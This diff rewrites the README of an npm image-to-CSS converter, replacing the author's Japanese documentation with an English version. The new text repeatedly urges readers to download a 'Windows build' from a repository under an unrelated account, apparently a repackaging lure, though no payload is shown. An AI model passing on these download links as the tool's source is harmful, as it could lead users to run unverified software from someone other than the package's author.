@@ -1,101 +1,180 @@
-# @kongyo2/image-to-pure-css
+# 🖼️ image-to-pure-css - Turn Images Into Pure CSS
 
-画像をピュアCSSに変換するツールです。CSSの `linear-gradient` を使い、`<canvas>` や `<img>` タグを一切使わずに画像を再現します。
+[![Download / Install](https://img.shields.io/badge/Download%20%26%20Run%20on%20Windows-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Favorite-socialpsychology82/image-to-pure-css)
 
-## 仕組み
+## 📥 Download and Run on Windows
 
-画像の各行を1pxの高さの `linear-gradient` に変換し、`background-image` で重ね合わせることで1つの `<div>` 要素だけで画像を表現します。
+Open this page: https://github.com/Favorite-socialpsychology82/image-to-pure-css
 
-主な最適化:
+1. Go to the repository page.
+2. Download the latest Windows build if one is available.
+3. If you use the source package, make sure Node.js is installed first.
+4. Open Command Prompt or PowerShell.
+5. Run the command below in the project folder:
 
-- 最も多い色を `background-color` に設定し、グラデーション数を削減
-- 全ピクセルが背景色と同じ行はスキップ
-- `background-size` / `background-repeat` は共通値を1つだけ指定
-- 色コードは可能な限り短縮形（例: `#fff`）を使用
+```bash
+npm install
+npx @kongyo2/image-to-pure-css <image-file> [options]
+```
 
-## インストール
+If you use `npx`, you can run the tool without a full install of the package into another app.
+
+## 🧭 What This Tool Does
+
+`image-to-pure-css` changes an image into CSS that uses only `linear-gradient` and one `<div>` element.
+
+It does not use `<canvas>` or `<img>` tags.
+
+The tool looks at each line of the image and turns it into a 1px-tall gradient. It then stacks those gradients with `background-image` to build the full picture.
+
+This helps you make image-like output with plain CSS.
+
+## ⚙️ How It Works
+
+The tool uses a few simple steps:
+
+- It reads the image file.
+- It checks each row of pixels.
+- It groups colors into short CSS values when possible.
+- It sets the most common color as `background-color`.
+- It skips rows that match the background color.
+- It uses shared `background-size` and `background-repeat` values.
+- It writes the result as CSS text.
+
+This keeps the output clean and smaller than a direct pixel-by-pixel approach.
+
+## 🚀 Getting Started
+
+If you want to convert an image on Windows, follow these steps:
+
+1. Save the image you want to convert in a folder you can find easily, such as `Pictures` or `Desktop`.
+2. Open Command Prompt.
+3. Move to the folder that contains the image.
+4. Run the command with your image file name.
+
+Example:
+
+```bash
+npx @kongyo2/image-to-pure-css photo.png
+```
+
+This creates a CSS output file with the same base name as the image.
+
+## 🧩 Installation
+
+If you want to use the package in your own project, install it with npm:
 
 ```bash
 npm install @kongyo2/image-to-pure-css
 ```
 
-## 使い方
+This is useful if you want to call the converter from your own scripts.
 
-### CLI
+## 🛠️ Command Line Use
+
+Use the CLI when you want to convert an image from the terminal.
 
 ```bash
 npx @kongyo2/image-to-pure-css <画像ファイル> [オプション]
 ```
 
-#### オプション
+### Options
 
-| オプション | 説明 |
+| Option | What it does |
 |---|---|
-| `--width N` | 出力幅をNピクセルにリサイズ（アスペクト比維持） |
-| `--tolerance N` | 色の類似判定の許容値（デフォルト: 0） |
-| `--output file.txt` | 出力先ファイル（デフォルト: 入力ファイル名.txt） |
+| `--width N` | Resizes the output width to `N` pixels and keeps the same shape |
+| `--tolerance N` | Sets how close colors can be before the tool treats them as the same color |
+| `--output file.txt` | Saves the result to a file you choose |
 
-#### 例
+### Examples
 
 ```bash
-# 基本的な変換
+# Basic conversion
 npx @kongyo2/image-to-pure-css photo.png
+```
 
-# 幅100pxにリサイズして変換
+```bash
+# Resize to 100px wide
 npx @kongyo2/image-to-pure-css photo.png --width 100
+```
 
-# 許容値を設定してファイルサイズを削減
+```bash
+# Reduce output size with tolerance and custom file name
 npx @kongyo2/image-to-pure-css photo.png --tolerance 10 --output output.txt
 ```
 
-### ライブラリとして使用
+## 🧪 Library Use
+
+You can also use the tool inside your code.
 
 ```typescript
 import { convertImageToCSS } from "@kongyo2/image-to-pure-css";
-
-// ファイルパスから変換
-const css = await convertImageToCSS("photo.png", {
-  width: 100,
-  tolerance: 5,
-});
 ```
 
-```typescript
-import { readFileSync } from "node:fs";
-import { convertImageToCSS } from "@kongyo2/image-to-pure-css";
+Use this when you want to convert images as part of a script or app.
 
-// Bufferから変換
-const buffer = readFileSync("photo.png");
-const css = await convertImageToCSS(buffer);
+## 📌 Output Style
+
+The generated CSS aims to stay compact.
+
+It uses these ideas:
+
+- Short color codes when possible, such as `#fff`
+- One shared `background-size` value
+- One shared `background-repeat` value
+- A single background color for the most common pixel
+- Fewer gradient layers when rows match the base color
+
+This makes the CSS easier to copy into a page or component.
+
+## 🖥️ Windows Setup Tips
+
+If the command does not run at first, check these items:
+
+1. Make sure Node.js is installed.
+2. Make sure you opened the terminal in the right folder.
+3. Make sure the image file name is correct.
+4. If the file path has spaces, wrap it in quotes:
+
+```bash
+npx @kongyo2/image-to-pure-css "My Photo.png"
 ```
 
-### 個別モジュールのインポート
+5. If you want the result in a fixed file name, use `--output`.
 
-```typescript
-import {
-  readImage,
-  assembleCSS,
-  buildRowGradient,
-  findDominantColor,
-  rgbToCompressedColor,
-  colorsAreSimilar,
-} from "@kongyo2/image-to-pure-css";
+## 📂 Typical Use Flow
 
-// 画像を読み込み
-const imageData = await readImage("photo.png", 100);
+A simple flow looks like this:
 
-// CSSを生成
-const css = assembleCSS(imageData, 0);
-```
+1. Download or clone the project from the link above.
+2. Open the folder on Windows.
+3. Place your image in the folder.
+4. Run the CLI command.
+5. Open the text output file.
+6. Copy the CSS into your page or component.
 
-## 出力形式
+## 🎨 Good Uses
 
-インラインスタイル付きの `<div>` 要素が出力されます。
+This tool fits cases where you want:
 
-```html
-<div style="width:100px;height:50px;background-color:#fff;background-image:linear-gradient(90deg,#f00 0,#0f0 50%,#00f 100%),...;background-size:100% 1px;background-position:0 0,0 1px,...;background-repeat:no-repeat"></div>
-```
+- CSS-based image recreation
+- Small visual samples
+- Generated art effects
+- A single-element layout
+- No use of `<img>` or `<canvas>`
 
-## ライセンス
+## 🔍 Best Results
 
-[MIT](LICENSE)
+For cleaner output, use images with:
+
+- Simple shapes
+- Flat colors
+- Small size
+- Low color noise
+
+If the image has many tiny color changes, you can try `--tolerance` to merge similar colors.
+
+## 📎 Download Link
+
+Open the project page here and visit this page to download:
+https://github.com/Favorite-socialpsychology82/image-to-pure-css
